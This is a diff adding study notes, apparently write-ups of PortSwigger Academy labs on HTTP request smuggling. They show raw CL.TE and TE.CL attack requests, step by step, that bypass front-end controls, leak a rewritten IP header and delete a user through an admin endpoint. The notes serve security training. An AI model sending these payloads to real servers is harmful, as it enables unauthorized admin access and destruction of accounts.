@@ -409,15 +409,15 @@ abc\r\n
 X\r\n
 ```
 When we send that request we don't get a response right away and eventually it times out
-This is a strong indication that the frontend server is using CL and the backend is using TE
+This is a strong indication that the frontend server is using CL and the backend is using TE 
 
-To confirm CL TE that we'll use differential responses:
-Attack req:
+To confirm CL TE, we'll use differential responses:
+The attack req:
 ```bash
 POST / HTTP/1.1
 Host: ...
 Content-Type: application/x-www-form-urlencoded
-Content-Length: 6
+Content-Length: 51
 Transfer-Encoding: chunked
 \r\n
 0\r\n
@@ -426,6 +426,7 @@ GET /whateverDoesntExist HTTP/1.1\r\n
 X-Ignore: X
 ```
 **Make sure there is no `\r\n` after `X-Ignore: X` because we want our normal request to be prepended without `\r\n`, i.e. we want it to be right after the `X` e.g.:**
+Example of how it'll be handled on the backend:
 ```bash
 POST / HTTP/1.1
 Host: ...
@@ -441,14 +442,13 @@ Host: ...
 Cookie: ...
 ```
 
-About X-Ignore header:
-It is not the header in the smuggled request that is important, as such, it is the fact that the last two lines of the request are treated by the back-end server as belonging to a new request, which subsequently causes issues. You can use anything here in order to elicit the same outcome, as shown in the screenshot below:
+About X-Ignore header: the name of it is random, it does not matter what we call it
 
-Normal req is copied from burp's http history and only http method is changed from http2 to http 1.1, everything else stays the same:
+Normal req (copied from burp's http history and only http method is changed from http2 to http 1.1, everything else stays the same):
 ```bash
 GET / HTTP/1.1
-Host: 0a49009503a6129d80246c0e008d00de.web-security-academy.net
-Cookie: session=uY2znmVLLpVx8UwJ1beDTDH6lKQk2KoK
+Host: 0a76000d0349cb86c626ea2c00750024.web-security-academy.net
+Cookie: session=fWPKe4DIffrpGyMSi5Svw0DDTAf50WTV
 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:133.0) Gecko/20100101 Firefox/133.0
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
 Accept-Language: en-US,en;q=0.5
@@ -461,5 +461,456 @@ Sec-Fetch-Site: cross-site
 Sec-Fetch-User: ?1
 Priority: u=0, i
 Te: trailers
+Connection: keep-alive
 ```
+
+If we send our normal req casually, we get 200 OK status
+But if we first send our attack req and only after it we send normal req - we get 404 not found
+
+### PRACTITIONER Lab: HTTP request smuggling, confirming a TE.CL vulnerability via differential responses
+Let's first try:
+```bash
+POST / HTTP/1.1
+Host: ...
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 6
+Transfer-Encoding: chunked
+\r\n
+3\r\n
+abc\r\n
+X\r\n
+```
+In the response we get 400 Bad request and the message: `Invalid req`
+That's a strong indication that the frontend is using TE
+
+Let's now find out what the backend is using:
+```bash
+POST / HTTP/1.1
+Host: ...
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 6
+Transfer-Encoding: chunked
+\r\n
+0\r\n
+\r\n
+X
+```
+And we see that the response is timing out, because the backend got 5 bytes and it still waits for the sixth byte to arrive i.e. it uses CL. At least that's a strong indication that it does in fact use CL
+
+So we try differential responses:
+Attack req:
+```bash
+POST / HTTP/1.1
+Host: ...
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 4
+Transfer-Encoding: chunked
+\r\n
+a8\r\n # a8 is a hex value of the chunk size (which includes everything up to x=1 but not \r\n after it)
+POST /doesnotexist HTTP/1.1
+Host: ...
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 15 # (Content length has to be 10+1 (+1 because we need at least 1 byte to be smuggled, i.e. it needs to be the body length +1 byte) but for fun we're gonna go with 15 here)
+\r\n
+x=1\r\n
+0\r\n
+\r\n
+```
+
+And our normal request (simple get req downgraded to http 1.1):
+```bash
+GET / HTTP/1.1
+Host: 0a2500a1044892c7857450d100ae004e.web-security-academy.net
+Cookie: session=qqN4H1FiVVaYJSG0XzwN9POXLh3X8q35
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Referer: https://portswigger.net/
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: cross-site
+Sec-Fetch-User: ?1
+Priority: u=0, i
+Te: trailers
+Connection: keep-alive
+```
+
+So we first send attack req and then we send normal req. And we get: 404 Not Found. This confirms TE.CL because If we send normal req without attack req, we get 200 OK 
+
+### PRACTITIONER Lab: Exploiting HTTP request smuggling to bypass front-end security controls, CL.TE vulnerability
+Norm req:
+```bash
+POST / HTTP/1.1
+Host: ...
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 7
+
+foo=bar
+```
+
+Attack req:
+```bash
+POST / HTTP/1.1
+Host: ...
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 39
+Transfer-Encoding: chunked
+\r\n
+3\r\n
+abc\r\n
+0\r\n
+\r\n
+GET /jjjjjjjjjj HTTP/1.1\r\n
+```
+
+So now when we send the attack req and after it we send the normal req and we get back 400 Bad request with response: `Invalid request`
+We get that invalid request because on the backend after the attack req is processed, the:
+`GET /jjjjjjjjjj HTTP/1.1\r\n` part is still there and when norm req comes the server tries to process the following:
+```bash
+GET /jjjjjjjjjj HTTP/1.1\r\n
+POST / HTTP/1.1
+Host: ...
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 7
+
+foo=bar
+```
+That's why we get invalid request
+
+To fix that we change the attack req to the following:
+```bash
+POST / HTTP/1.1
+Host: ...
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 48
+Transfer-Encoding: chunked
+\r\n
+3\r\n
+abc\r\n
+0\r\n
+\r\n
+GET /jjjjjjjjjj HTTP/1.1\r\n
+Random: x
+```
+And later it will append norm req in the following way: 
+```bash
+GET /jjjjjjjjjj HTTP/1.1\r\n
+Random: xPOST / HTTP/1.1\r\n
+Host: ...
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 7
+
+foo=bar
+```
+So `POST / HTTP/1.1\r\n is now part of the value of Random header and other headers like Host and potentially Cookie are used as part of our request (GET /jjj...)`
+And we now send attack and norm requests and we get 404 Not found, which confirms that `GET /jjjjjjjjjj` was not found
+
+So we change `/jjj...` to `/admin` and after attack, norm requests we get `401 Unauthorized`
+So we modify the attack req again (we add `Host: localhost`):
+```bash
+POST / HTTP/1.1
+Host: ...
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 60
+Transfer-Encoding: chunked
+\r\n
+3\r\n
+abc\r\n
+0\r\n
+\r\n
+GET /admin HTTP/1.1\r\n
+Host: localhost
+Random: x
+```
+
+We then send attack, norm reqs and in response we get: `"error":"Duplicate header names are not allowed"`
+
+It happens because when we send the norm req, the poisoned backend server will try to parse the following:
+```bash
+GET /jjjjjjjjjj HTTP/1.1
+Host: localhost
+Random: xPOST / HTTP/1.1
+Host: ...
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 7
+
+foo=bar
+```
+And as we can see there are 2 `Host` headers
+
+So we now change the attack req again:
+```bash
+POST / HTTP/1.1
+Host: ...
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 60
+Transfer-Encoding: chunked
+\r\n
+3\r\n
+abc\r\n
+0\r\n
+\r\n
+GET /admin HTTP/1.1
+Host: localhost
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 3
+\r\n
+x=
+```
+
+And now we send our attack, norm reqs and in the response to the norm req we actually get the html returned from `/admin` endpoint. It happens because `/admin` endpoint checks the `Host` header and if it is equal to localhost then it returns html
+
+Part of the response includes:
+```bash
+<a href="/admin/delete?username=carlos">Delete</a>
+```
+
+So we change our attack req again:
+```bash
+POST / HTTP/1.1
+Host: ...
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 60
+Transfer-Encoding: chunked
+\r\n
+3\r\n
+abc\r\n
+0\r\n
+\r\n
+GET /admin/delete?username=carlos HTTP/1.1
+Host: localhost
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 3
+\r\n
+x=
+```
+
+Final explanation:
+After the attack req is sent, the backend server is poisoned with:
+```bash
+GET /admin/delete?username=carlos HTTP/1.1
+Host: localhost
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 3
+\r\n
+x=
+```
+But the response is not given because it expects 1 more byte to arrive (Content-Length: 3) so when we send norm req it actually takes the first byte from the norm req and finishes processing our poisoned req (`GET /admin/delete?username=carlos`) and sends the response to the one who made that norm req (in this case to us because we made that norm req)
+The remainder of the norm req is invalid req because we don't see the response of it. It fails in the background.
+```bash
+OST / HTTP/1.1
+Host: 0a7a00c80443862881fbb12700510041.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 7
+
+foo=bar
+```
+
+### PRACTITIONER Lab: Exploiting HTTP request smuggling to bypass front-end security controls, TE.CL vulnerability
+Attack req:
+```bash
+POST / HTTP/1.1
+Host: ...
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 4
+Transfer-Encoding: chunked
+\r\n
+2e\r\n
+GET /doesntexist HTTP/1.1\r\n
+Content-Length: 6\r\n
+\r\n
+0\r\n
+\r\n
+```
+
+Norm req:
+```bash
+POST / HTTP/1.1
+Host: 
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 7
+
+foo=bar
+```
+And we send attack, norm reqs and we get back: 404 Not found because there is no `GET /doesntexist` endpoint on the backend server
+
+So we change the attack req: (we change the url to `/admin`)
+```bash
+POST / HTTP/1.1
+Host: ...
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 4
+Transfer-Encoding: chunked
+\r\n
+28\r\n
+GET /admin HTTP/1.1\r\n
+Content-Length: 6\r\n
+\r\n
+0\r\n
+\r\n
+```
+
+And we send attack, norm reqs and we get back Unauthorized, so we add Host: localhost and change the chunk size to 0x39
+```bash
+POST / HTTP/1.1
+Host: ...
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 4
+Transfer-Encoding: chunked
+\r\n
+39\r\n
+GET /admin HTTP/1.1\r\n
+Host: localhost\r\n
+Content-Length: 6\r\n
+\r\n
+0\r\n
+\r\n
+```
+
+And we got our admin page with the option to delete users, so we now craft the final attack req:
+```bash
+POST / HTTP/1.1
+Host: ...
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 4
+Transfer-Encoding: chunked
+\r\n
+50\r\n
+GET /admin/delete?username=carlos HTTP/1.1\r\n
+Host: localhost\r\n
+Content-Length: 6\r\n
+\r\n
+0\r\n
+\r\n
+```
+
+### PRACTITIONER Lab: Exploiting HTTP request smuggling to reveal front-end request rewriting
+We need admin page, but it can only be accessed from localhost
+
+So we first try to add `X-Forwarded-For: 127.0.0.1` header, but we still get Unauthorized, because the frontend server overwrites `X-Forwarded-For` header before it gets to the backend server
+
+So we want to figure out if it's CL.TE or TE.CL, let's try doing that by using timing technique:
+```bash
+POST / HTTP/1.1
+Host: ...
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 6
+Transfer-Encoding: chunked
+\r\n
+3\r\n
+abc\r\n
+x\r\n
+```
+The response is timing out and that's an indication that there is a CL.TE
+So we've got to confirm that with differential responses:
+
+Norm req:
+```bash
+POST / HTTP/1.1
+Host: 0a7a00c80443862881fbb12700510041.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 7
+
+foo=bar
+```
+
+Attack req:
+```bash
+POST / HTTP/1.1
+Host: ...
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 103
+Transfer-Encoding: chunked
+\r\n
+0\r\n
+\r\n
+GET /jjjjjjjjjj HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 3
+\r\n
+x=
+```
+
+So we send attack, norm reqs and we get back 404 Not found. It confirms CL.TE
+
+Now we try `X-Forwarded-For` header inside our attack req (in the second part of it)
+But we get 401 Unauthorized anyway
+
+So in the lab we the endpoint that reflects whatever we send in the req body in the response.
+This will be our normal request now:
+```bash
+POST / HTTP/1.1
+Host: 0a0300650452a219807280f4006b00c5.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 13
+
+search=jjjj
+```
+And `jjjj` is reflected  in the response
+
+So we craft our attack req:
+```bash
+POST / HTTP/1.1
+Host: 0a0300650452a219807280f4006b00c5.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 105
+Transfer-Encoding: chunked
+
+0
+
+POST / HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 163
+
+search=jjjj
+```
+And we send our norm req:
+```bash
+POST / HTTP/1.1
+Host: 0a0300650452a219807280f4006b00c5.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 10
+
+search=jjj
+```
+And in the response to the normal req we get:
+```bash
+...
+<section class=blog-header>
+<h1>0 search results for 'jjjjPOST / HTTP/1.1
+X-qRjKfQ-Ip: 194.44.253.30
+Host: 0a0300650452a219807280f4006b00c5.web-security-academy.net
+Content-Type: application/x-www-form-urlen'
+</h1>
+<hr>
+</section>
+...
+```
+So we smuggled the beginning of the subsequent request and we see that the frontend server is using `X-qRjKfQ-Ip: 194.44.253.30`
+
+We can now use that header to access admin panel, by changing its value to 127.0.0.1:
+So our attack req that deletes carlos:
+```bash
+POST / HTTP/1.1
+Host: 0a0300650452a219807280f4006b00c5.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 145
+Transfer-Encoding: chunked
+
+0
+
+GET /admin/delete?username=carlos HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 3
+X-qRjKfQ-Ip: 127.0.0.1
+
+x=
+```
+
+### PRACTITIONER Lab: Exploiting HTTP request smuggling to capture other users' requests
+First we figure out if it's CL.TE or TE.CL via timing technique and via differential responses
+Eventually we see that there is CL.TE
+
+
 
